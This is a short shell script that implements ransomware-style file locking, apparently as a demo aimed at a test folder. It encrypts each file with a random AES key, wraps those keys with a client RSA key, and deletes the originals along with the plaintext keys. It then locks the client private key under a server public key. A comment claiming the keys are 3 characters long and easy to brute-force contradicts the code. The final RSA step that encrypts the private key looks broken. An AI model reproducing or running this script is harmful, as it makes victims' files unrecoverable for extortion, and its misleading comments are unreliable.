DIR_PATH='./test_files'
files=$(ls $DIR_PATH)
# Create a client private key
openssl genrsa \
	-out client_private_key.pem 2048 &&
openssl rsa \
	-pubout \
	-in client_private_key.pem \
	-out client_public_key.pem \
	-outform PEM &&
for file in $files
do
	# Encrypt everything in DIR_PATH using 
	# The length is 3 characters for smaller rsa key size
	# thus a brute force can easily decrypt the files
	openssl rand -base64 128 -out $file.key.bin
	openssl enc \
		-aes-256-cbc \
		-salt \
		-in $DIR_PATH'/'$file \
		-out $DIR_PATH'/'$file'.enc' \
		-pass file:./$file.key.bin
	# Encrypt the AES key pairs using the client public key
	openssl rsautl \
		-encrypt \
		-inkey client_public_key.pem \
		-pubin \
		-in $file.key.bin \
		-out $file.key.bin.enc
	rm ./test_files/$file $file.key.bin
done

# Encrypt the client private key with the server public key
openssl rsautl \
		-encrypt \
		-inkey server_public_key.pem \
		-pubin \
		-in client_private_key.pem \
		-out client_private_key.pem.new &&

rm client_private_key.pem
mv client_private_key.pem.new client_private_key.pem